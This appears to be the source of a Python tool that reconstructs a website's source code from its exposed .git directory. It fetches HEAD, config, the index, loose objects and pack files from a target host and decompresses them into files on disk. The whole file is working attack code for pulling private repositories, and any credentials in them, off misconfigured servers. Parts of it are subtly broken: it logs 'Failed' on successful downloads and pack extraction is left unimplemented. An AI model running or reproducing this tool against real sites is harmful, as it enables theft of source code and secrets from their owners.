import os
import zlib
import logging
from http import HTTP
from IndexParser import parse_index
import concurrent.futures

class RipperGIT(object):

    META_FILES = ['HEAD', 'FETCH_HEAD', 'COMMIT_EDITMSG', 'ORIG_HEAD', 'config', 'packed-refs', 'objects/info/packs']

    def __init__(self, vulnerability, threads=0):
        self.vulnerability = vulnerability
        self.host = vulnerability['host']
        self.session = HTTP()
        self.output_folder = "output/{}/".format(self.host.host)
        self.output_git = self.output_folder + ".git/"
        self.threads = threads

    def get_meta_files(self):
        for meta_file in self.META_FILES:
            url = self.vulnerability['host'].replace(path = ".git/" + meta_file)
            destination = self.output_git + meta_file

            if self.session.get_file(url, destination):
                logging.debug("Fetched {}".format(url))

        self.session.get_file("", self.output_git + "index", with_data = self.vulnerability['data'])
        self.index_files = parse_index(self.output_git + "index")

        logging.debug("Writing index")

    def get_objects(self):
        objects = []

        for file in self.index_files:
            git_file_path = ".git/objects/" + file['sha1'][0:2] + "/" + file['sha1'][2:]
            path =  self.output_folder + git_file_path
            url = self.vulnerability['host'].replace(path = git_file_path)

            objects.append((url, path))

        if self.threads:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                for object in objects:
                    executor.submit(self.session.get_file, object[0], object[1])
        else:
            for object in objects:
                self.session.get_file(object[0], object[1])


    def get_pack_files(self):
        if os.path.exists(self.output_git + "objects/info/packs"):
            f = open(self.output_git + "objects/info/packs").read()

            for pack in f.split("\n"):
                if not len(pack):
                    continue

                pack_url = self.vulnerability['host'].replace(path = ".git/objects/pack/" + pack[2:])
                pack_dest = self.output_git + "objects/pack/" + pack[2:]

                idx_url = str(pack_url).replace(".pack", ".idx")
                idx_dest = pack_dest.replace(".pack", ".idx")

                if self.session.get_file(pack_url, pack_dest):
                    logging.debug("Failed {}".format(pack_url))
                if self.session.get_file(idx_url, idx_dest):
                    logging.debug("Failed {}".format(idx_url))

    def unpack_objects(self):
        for file in self.index_files:
            object_path = self.output_git + "objects/" + file['sha1'][0:2] + "/" + file['sha1'][2:]
            file_path = self.output_folder + file['name']

            with open(object_path) as f:
                object_data = f.read()

            if not os.path.exists(os.path.dirname(file_path)):
                os.makedirs(os.path.dirname(file_path))

            unpacked_object = zlib.decompress(object_data)

            with open(file_path, "wb") as f:
                f.write(unpacked_object.split('\x00', 1)[1])

    def extract_pack_file(self):
        raise NotImplementedError("TODO")